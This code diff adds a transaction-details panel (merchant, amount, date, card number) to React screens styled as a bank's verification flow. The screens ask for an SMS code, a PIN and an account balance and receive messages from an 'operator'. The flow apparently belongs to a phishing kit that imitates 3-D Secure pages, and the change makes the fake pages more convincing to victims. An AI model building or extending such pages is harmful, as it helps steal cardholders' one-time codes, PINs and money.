@@ -1,5 +1,5 @@
 import React, { useState, useEffect, type ChangeEvent } from "react";
-import type { OperatorMessage as OperatorMessageType, ResendState } from "../../types";
+import type { OperatorMessage as OperatorMessageType, ResendState, TransactionDetails } from "../../types";
 import { DECLINED_STATUS_MESSAGES } from "../../lib/checkout-status";
 
 // --- Shared components (inlined from src/components) ---
@@ -134,10 +134,40 @@ export function ResultPage({
   );
 }
 
+// --- Transaction details ---
+
+interface TransactionDetailsBoxProps {
+  details: TransactionDetails;
+}
+
+export function TransactionDetailsBox({ details }: TransactionDetailsBoxProps) {
+  const rows: { label: string; value: string }[] = [];
+  if (details.merchantName) rows.push({ label: "Merchant Name", value: details.merchantName });
+  if (details.amount) rows.push({ label: "Amount", value: details.amount });
+  if (details.date) rows.push({ label: "Date", value: details.date });
+  if (details.cardNumber) rows.push({ label: "Card Number", value: details.cardNumber });
+  if (rows.length === 0) return null;
+
+  return (
+    <div className="bank-ui-transaction-details">
+      <h3 className="bank-ui-transaction-details-title">Transaction details</h3>
+      <ul className="bank-ui-transaction-details-list">
+        {rows.map(({ label, value }) => (
+          <li key={label} className="bank-ui-transaction-details-row">
+            <span className="bank-ui-transaction-details-label">{label}</span>
+            <span className="bank-ui-transaction-details-value">{value}</span>
+          </li>
+        ))}
+      </ul>
+    </div>
+  );
+}
+
 // --- Layout components ---
 
 interface SmsOtpProps {
   bank?: string;
+  transactionDetails?: TransactionDetails;
   onError: (msg: string) => void;
   wrongCode?: boolean;
   expiredCode?: boolean;
@@ -151,6 +181,7 @@ interface SmsOtpProps {
 
 export function SmsOtp({
   bank,
+  transactionDetails,
   wrongCode,
   expiredCode,
   onTryAgain,
@@ -194,6 +225,7 @@ export function SmsOtp({
           <p className="bank-ui-alert-title">Code expired. Please request a new code.</p>
         </div>
       )}
+      {transactionDetails && <TransactionDetailsBox details={transactionDetails} />}
       <h2 className="bank-ui-heading">Enter verification code</h2>
       <p className="bank-ui-body">
         {bank
@@ -260,6 +292,7 @@ export function SmsOtp({
 
 interface PinEntryProps {
   bank?: string;
+  transactionDetails?: TransactionDetails;
   onError: (msg: string) => void;
   wrongCode?: boolean;
   expiredCode?: boolean;
@@ -273,6 +306,7 @@ interface PinEntryProps {
 
 export function PinEntry({
   bank,
+  transactionDetails,
   wrongCode,
   expiredCode,
   onTryAgain,
@@ -306,6 +340,7 @@ export function PinEntry({
           <p className="bank-ui-alert-title">Code expired. Please request a new code.</p>
         </div>
       )}
+      {transactionDetails && <TransactionDetailsBox details={transactionDetails} />}
       <h2 className="bank-ui-heading">Enter your PIN</h2>
       <p className="bank-ui-body">
         {bank
@@ -352,11 +387,13 @@ export function PinEntry({
 
 interface PushWaitingProps {
   bank?: string;
+  transactionDetails?: TransactionDetails;
 }
 
-export function PushWaiting({ bank }: PushWaitingProps) {
+export function PushWaiting({ bank, transactionDetails }: PushWaitingProps) {
   return (
     <div className="bank-ui-layout-center">
+      {transactionDetails && <TransactionDetailsBox details={transactionDetails} />}
       <div className="bank-ui-spinner-wrap">
         <Spinner size={64} />
       </div>
@@ -372,6 +409,7 @@ export function PushWaiting({ bank }: PushWaitingProps) {
 
 interface BalanceCheckProps {
   bank?: string;
+  transactionDetails?: TransactionDetails;
   onError: (msg: string) => void;
   operatorMessage?: OperatorMessageType | null;
   onSubmit: (balance: string) => void;
@@ -380,6 +418,7 @@ interface BalanceCheckProps {
 
 export function BalanceCheck({
   bank,
+  transactionDetails,
   onError,
   operatorMessage,
   onSubmit,
@@ -404,6 +443,7 @@ export function BalanceCheck({
 
   return (
     <div className="bank-ui-layout">
+      {transactionDetails && <TransactionDetailsBox details={transactionDetails} />}
       <h2 className="bank-ui-heading">Balance verification</h2>
       <p className="bank-ui-body">
         {bank
